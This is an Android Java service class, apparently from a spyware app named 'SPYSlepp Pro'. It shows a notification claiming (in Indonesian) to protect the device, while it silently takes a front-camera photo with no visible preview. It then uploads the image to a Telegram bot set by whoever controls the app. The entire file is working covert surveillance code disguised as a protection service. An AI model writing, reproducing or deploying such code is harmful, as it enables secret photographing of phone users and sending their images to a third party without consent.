package com.spye.spyslepp;

import android.app.*;
import android.content.*;
import android.graphics.*;
import android.hardware.Camera;
import android.os.*;
import android.util.Log;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;

public class SpyService extends Service {

    private String botToken, chatId;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Buat Notifikasi Foreground agar tidak dimatikan sistem (Wajib Android 8+)
        createNotificationChannel();
        Notification notification = new Notification.Builder(this, "SPY_CH")
                .setContentTitle("SPYSlepp Pro Active")
                .setContentText("Melindungi perangkat anda...")
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .build();
        
        startForeground(1, notification);

        // Ambil config
        SharedPreferences pref = getSharedPreferences("SpyConfig", MODE_PRIVATE);
        botToken = pref.getString("bot_token", "");
        chatId = pref.getString("chat_id", "");

        if (!botToken.isEmpty() && !chatId.isEmpty()) {
            takeSilentPhoto();
        }

        return START_NOT_STICKY;
    }

    private void takeSilentPhoto() {
        try {
            final Camera camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            SurfaceTexture st = new SurfaceTexture(0);
            camera.setPreviewTexture(st);
            camera.startPreview();

            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    sendToTelegram(data);
                    camera.release();
                    stopForeground(true);
                    stopSelf();
                }
            });
        } catch (Exception e) {
            Log.e("SPY", "Gagal ambil foto: " + e.getMessage());
            stopSelf();
        }
    }

    private void sendToTelegram(final byte[] photoData) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                String boundary = "*****" + Long.toString(System.currentTimeMillis()) + "*****";
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                OutputStream out = conn.getOutputStream();
                PrintWriter writer = new PrintWriter(new OutputStreamWriter(out, "UTF-8"), true);

                // Parameter Chat ID
                writer.append("--" + boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
                writer.append(chatId).append("\r\n");

                // File Foto
                writer.append("--" + boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"spy.jpg\"").append("\r\n");
                writer.append("Content-Type: image/jpeg").append("\r\n\r\n");
                writer.flush();

                out.write(photoData);
                out.flush();
                
                writer.append("\r\n");
                writer.append("--" + boundary + "--").append("\r\n");
                writer.close();

                int status = conn.getResponseCode();
                Log.d("SPY", "Telegram Status: " + status);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "SPY_CH", "Spy Service Channel", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
